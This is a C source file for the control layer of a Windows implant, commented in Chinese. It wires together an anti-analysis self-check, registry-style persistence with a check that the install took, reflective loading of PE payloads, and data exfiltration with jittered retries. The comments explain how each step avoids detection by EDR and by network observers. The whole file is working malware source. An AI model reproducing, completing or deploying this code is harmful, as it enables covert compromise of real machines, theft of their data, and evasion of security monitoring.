/*
 * agent_windows/src/implant_main.c
 *
 * Windows 单体植入体接线层实现。
 *
 * 刻意保持平台无关 C99：本文件不含任何 Windows API，所有平台相关能力
 * （驻留命令执行、对抗打桩、采集后端、回传信道）均以回调注入。因此它能
 * 在 winshim 上被真实编译、真实执行、真实断言，而不必等到 Windows 真机。
 */
#include "implant_main.h"

#include <string.h>

/* 退避自旋的最大迭代数：宿主时间源若不推进，不能把进程挂死。 */
#define IMW_SPIN_MAX 2000000u

typedef struct {
    const imw_cfg_t   *cfg;
    const imw_hooks_t *h;
    uint32_t           exfil_fail;
    uint64_t           xr;        /* xorshift 状态，仅用于抖动 */
} imw_ctx_t;

static uint64_t imw_xnext(uint64_t *s)
{
    uint64_t x = *s;
    if (x == 0) x = 0x9E3779B97F4A7C15ull;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *s = x;
    return x;
}

/*
 * 退避：等待到时间源推进过指定时长。
 *
 * 为什么不用 sleep/usleep：真实部署里退避必须能被宿主时间源与停止信号
 * 共同控制，而测试里假时间源每次调用前进一跳，自旋即可完成等待。
 * 若宿主时间源根本不推进（恒返回同值），自旋会在 IMW_SPIN_MAX 次后放弃
 * —— 绝不把进程挂死在这里。
 */
static void imw_backoff(imw_ctx_t *c, uint32_t ms)
{
    if (!c->h->now || ms == 0) return;

    uint64_t t0 = c->h->now(c->h->now_ud);
    uint64_t target = t0 + (uint64_t)ms * 1000ull;

    for (uint32_t i = 0; i < IMW_SPIN_MAX; i++) {
        if (c->h->now(c->h->now_ud) >= target) return;
    }
}

/*
 * 回传包装：有界重试 + 抖动退避。
 *
 * 抖动是必需的，不是装饰：若退避是固定值，一批被控端同时断线后会同时
 * 重连，在链路上形成"静默-爆发"节拍，这本身就是可观测特征。
 */
static int imw_exfil_wrap(const uint8_t *data, size_t len,
                          const char *name, void *ud)
{
    imw_ctx_t *c = (imw_ctx_t *)ud;
    const imw_cfg_t *cfg = c->cfg;
    uint32_t tries = cfg->exfil_retries + 1u;

    for (uint32_t i = 0; i < tries; i++) {
        int rc = c->h->exfil(data, len, name, c->h->exfil_ud);
        if (rc == 0) return 0;

        if (i + 1u < tries) {
            uint32_t base = cfg->backoff_ms * (i + 1u);
            uint32_t jit = cfg->backoff_ms
                         ? (uint32_t)(imw_xnext(&c->xr) % (uint64_t)cfg->backoff_ms)
                         : 0u;
            imw_backoff(c, base + jit);
        }
    }

    c->exfil_fail++;
    return -1;
}

/* 对抗自检。返回 IMW_OK 表示安全。 */
static int imw_selfcheck(const imw_hooks_t *h)
{
    if (!h->defend) return IMW_OK;          /* 未注入 = 跳过（仅测试） */
    if (h->defend(h->defend_ud) != 0) return IMW_ERR_UNSAFE;
    return IMW_OK;
}

/*
 * 驻留。装完必须查询确认 —— 只信 pw_install 的返回值是不够的：
 * 注册表写入成功但值名被 EDR 重定向、或被同名旧项覆盖，都会表现为
 * "装了但实际不会拉起"。查询是唯一硬证据。
 */
static int imw_persist(const imw_cfg_t *cfg, const imw_hooks_t *h,
                       imw_result_t *out)
{
    if (!cfg->persist_name || !cfg->persist_cmd) {
        out->persist_rc = 0;
        out->installed  = -1;
        return IMW_OK;
    }

    pw_cfg_t pc;
    memset(&pc, 0, sizeof(pc));
    pc.name    = cfg->persist_name;
    pc.cmdline = cfg->persist_cmd;
    pc.exec    = h->pexec;
    pc.exec_ud = h->pexec_ud;

    int rc = pw_install(cfg->persist_method, &pc);
    out->persist_rc = rc;

    if (rc != PW_OK) {
        out->installed = 0;
        return cfg->strict_persist ? IMW_ERR_PERSIST : IMW_OK;
    }

    int installed = 0;
    if (pw_query(cfg->persist_method, &pc, &installed) == PW_OK) {
        out->installed = installed ? 1 : 0;
    } else {
        out->installed = -1;   /* 查不到：不谎报成功 */
    }

    return IMW_OK;
}

static void imw_result_init(imw_result_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->persist_rc = 0;
    out->installed  = -1;
    out->imp_err    = IMPLANT_OK;
}

static int imw_check_args(const imw_cfg_t *cfg, const imw_hooks_t *h)
{
    if (!cfg || !h) return IMW_ERR_PARAM;
    if (!h->pack)   return IMW_ERR_NOPACK;
    if (!h->exfil)  return IMW_ERR_NOEXFIL;
    return IMW_OK;
}

int imw_bootstrap(const imw_cfg_t *cfg, const imw_hooks_t *h,
                  imw_result_t *out)
{
    imw_result_init(out);

    int rc = imw_check_args(cfg, h);
    if (rc != IMW_OK) {
        if (out) out->rc = rc;
        return rc;
    }

    /* 顺序不可换：不安全环境里连驻留都不能做，否则留下可归因的安装痕迹。 */
    rc = imw_selfcheck(h);
    if (rc != IMW_OK) {
        if (out) out->rc = rc;
        return rc;
    }

    imw_result_t tmp;
    imw_result_init(&tmp);

    rc = imw_persist(cfg, h, &tmp);
    if (out) {
        out->rc         = rc;
        out->persist_rc = tmp.persist_rc;
        out->installed  = tmp.installed;
    }
    return rc;
}

int imw_reflect_run(const imw_cfg_t *cfg, const imw_hooks_t *h,
                    const rr_hooks_t *rh,
                    const uint8_t *pe, size_t pe_len,
                    uint8_t *region, size_t region_size,
                    imw_result_t *out)
{
    rr_result_t rr;
    int rc;

    imw_result_init(out);

    if (!cfg || !h) {
        if (out) out->rc = IMW_ERR_PARAM;
        return IMW_ERR_PARAM;
    }

    /*
     * 对抗自检先于装载：装载会在目标机上产生权限切换与代码执行痕迹，
     * 在不安全环境里做这一步，比什么都不做暴露得多。
     */
    rc = imw_selfcheck(h);
    if (rc != IMW_OK) {
        if (out) out->rc = rc;
        return rc;
    }

    if (!pe || pe_len == 0 || !region || region_size == 0 || !rh) {
        if (out) out->rc = IMW_ERR_PARAM;
        return IMW_ERR_PARAM;
    }

    memset(&rr, 0, sizeof(rr));
    rc = rr_load_run(pe, pe_len, region, region_size, rh, &rr);

    if (out) {
        out->reflect_rc    = rc;
        out->n_reloc       = rr.n_reloc;
        out->n_import      = rr.n_import;
        out->n_tls         = (uint32_t)rr.n_tls;
        out->entry_invoked = rr.entry_invoked;
        out->rc            = (rc == RR_OK) ? IMW_OK : IMW_ERR_REFLECT;
    }
    return (rc == RR_OK) ? IMW_OK : IMW_ERR_REFLECT;
}

int imw_run(const imw_cfg_t *cfg, const imw_hooks_t *h, imw_result_t *out)
{
    imw_result_init(out);

    int rc = imw_check_args(cfg, h);
    if (rc != IMW_OK) {
        if (out) out->rc = rc;
        return rc;
    }

    rc = imw_selfcheck(h);
    if (rc != IMW_OK) {
        if (out) {
            out->rc        = rc;
            out->installed = -1;
        }
        return rc;
    }

    imw_ctx_t c;
    memset(&c, 0, sizeof(c));
    c.cfg = cfg;
    c.h   = h;
    c.xr  = 0x243F6A8885A308D3ull;

    imw_result_t tmp;
    imw_result_init(&tmp);
    rc = imw_persist(cfg, h, &tmp);
    if (out) {
        out->persist_rc = tmp.persist_rc;
        out->installed  = tmp.installed;
    }
    if (rc != IMW_OK) {
        if (out) out->rc = rc;
        return rc;
    }

    implant_t *im = implant_create(&cfg->imp, cfg->backend);
    if (!im) {
        if (out) {
            out->rc      = IMW_ERR_IMPLANT;
            out->imp_err = IMPLANT_ERR_MEM;
        }
        return IMW_ERR_IMPLANT;
    }

    if (h->now)  implant_set_now(im, h->now, h->now_ud);
    implant_set_pack(im, h->pack, h->pack_ud);
    implant_set_exfil(im, imw_exfil_wrap, &c);
    if (h->defend) implant_set_defend(im, h->defend, h->defend_ud);

    implant_err_t ie = implant_run(im);
    const implant_stats_t *st = implant_stats(im);

    if (out) {
        out->batches    = st->batches_done;
        out->frames     = st->frames_total;
        out->bytes      = st->bytes_total;
        out->errors     = st->errors;
        out->imp_err    = ie;
        out->exfil_fail = c.exfil_fail;
        out->rc         = (ie == IMPLANT_OK || ie == IMPLANT_STOPPED)
                        ? IMW_OK : IMW_ERR_IMPLANT;
    }

    implant_destroy(im);

    return out ? out->rc
               : ((ie == IMPLANT_OK || ie == IMPLANT_STOPPED)
                  ? IMW_OK : IMW_ERR_IMPLANT);
}

const char *imw_errstr(int rc)
{
    switch (rc) {
    case IMW_OK:           return "ok";
    case IMW_ERR_PARAM:    return "bad param";
    case IMW_ERR_UNSAFE:   return "environment unsafe (no action taken)";
    case IMW_ERR_NOPACK:   return "no pack hook (refusing plaintext)";
    case IMW_ERR_NOEXFIL:  return "no exfil hook";
    case IMW_ERR_IMPLANT:  return "implant loop failed";
    case IMW_ERR_PERSIST:  return "persistence failed (strict)";
    case IMW_ERR_REFLECT:  return "reflective load/run failed";
    default:               return "unknown";
    }
}
